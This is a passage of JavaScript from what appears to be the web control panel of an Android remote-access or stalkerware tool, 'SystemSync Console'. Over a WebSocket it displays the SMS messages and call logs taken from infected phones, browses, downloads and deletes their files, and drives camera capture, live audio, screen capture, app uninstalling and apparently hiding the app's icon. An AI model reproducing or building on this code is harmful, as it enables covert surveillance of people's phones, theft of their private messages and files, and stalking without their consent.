    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        let headers = [], rows = [];
        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'
            ]);
        } else {
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 20;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    function renderFiles() {
        let html = `
            <div class="file-manager">
                <div class="file-toolbar-sticky">
                    <div class="file-toolbar">
                        <button onclick="navigateUp()">⬆ Up</button>
                        <span class="file-path">${currentPath}</span>
                        <div class="download-selected">
                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
                        </div>
                    </div>
                </div>
        `;

        if (!currentData || currentData.length === 0) {
            html += '<p style="padding:20px;">No files found.</p>';
        } else {
            const folders = currentData.filter(item => item.isDir);
            const files = currentData.filter(item => !item.isDir);
            selectedFiles = [];

            html += `
                <div class="file-panes">
                    <div class="folder-pane">
                        <div class="pane-title">Folders</div>
                        <div id="folderList">
            `;

            folders.forEach(f => {
                html += `
                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
                        <span class="folder-icon">📁</span>
                        <span class="folder-name">${f.name}</span>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                    <div class="file-pane">
                        <div class="pane-title">Files</div>
                        <div id="fileList">
            `;

            files.forEach(f => {
                const path = f.path;
                const name = f.name;
                const size = formatBytes(f.size);
                html += `
                    <div class="file-item">
                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
                        <span class="file-icon">📄</span>
                        <span class="file-name">${name}</span>
                        <span class="file-size">${size}</span>
                        <div class="file-actions">
                            <button class="delete" onclick="deleteFile('${path}')" title="Delete">🗑</button>
                        </div>
                    </div>
                `;
            });

            html += `
                        </div>
                    </div>
                </div>
            `;
        }

        html += '</div>';
        panel.innerHTML = html;
    }

    function handleFolderClick(path) {
        currentPath = path;
        sendCommand('LIST_FILES', { path: path });
    }

    function navigateUp() {
        if (currentPath === 'root' || currentPath === '') return;
        let parts = currentPath.split('/');
        parts.pop();
        let parent = parts.join('/');
        if (parent === '') parent = 'root';
        currentPath = parent;
        sendCommand('LIST_FILES', { path: parent });
    }

    function updateSelected(checkbox) {
        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) selectedFiles.push(path);
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;
        }
    }

    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;
        }
        selectedFiles.forEach(path => {
            sendPlainText('dl ' + path);
        });
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function showNotification(text) {
        const orig = statusEl.innerText;
        statusEl.innerText = text;
        setTimeout(() => { statusEl.innerText = orig; }, 2000);
    }

    // ---------- WEBSOCKET MESSAGE HANDLER ----------
    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                handleJSON(json);
            }
        } catch (e) {
            handlePlainText(msg);
        }
    }

    // ---------- WEBSOCKET CONNECTION ----------
    function connectWebSocket() {
        if (ws) {
            ws.close();
        }
        setStatus('CONNECTING');
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send('I_AM_WEB');
            setStatus('ONLINE');
            
            // Clear welcome message but keep it visible until devices appear
            document.getElementById('welcomeMessage').innerHTML = `
                <h2>👋 Welcome to SystemSync Console</h2>
                <p>Waiting for devices to connect...</p>
                <p>When a device installs the app, it will appear in the dropdown menu above.</p>
            `;
            document.getElementById('welcomeMessage').style.display = 'block';
            
            // Request list of online devices if supported by server
            ws.send(JSON.stringify({
                type: 'GET_DEVICES'
            }));
        };
        ws.onmessage = (e) => {
            console.log('RAW message:', e.data);
            handleIncomingMessage(e.data);
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
            ws = null;
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }

    // Hide flash option for front camera
    document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
        radio.addEventListener('change', function() {
            const flashCheckbox = document.getElementById('clickFlashCheckbox');
            const flashOption = document.getElementById('flashOption');
            if (this.value === 'front') {
                flashOption.style.display = 'none';
                flashCheckbox.checked = false;
            } else {
                flashOption.style.display = '';
            }
        });
    });

    window.addEventListener('load', () => {
        const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
        if (selected && selected.value === 'front') {
            document.getElementById('flashOption').style.display = 'none';
        }
    });

    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.snapScreen = snapScreenFromModal;
    window.getInstalledApps = getInstalledApps;
    window.uninstallApp = uninstallApp;
    window.openApp = openApp;
    window.deleteFile = deleteFile;
    window.switchDevice = switchDevice;

    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    // ---------- START ----------
    connectWebSocket();
</script>
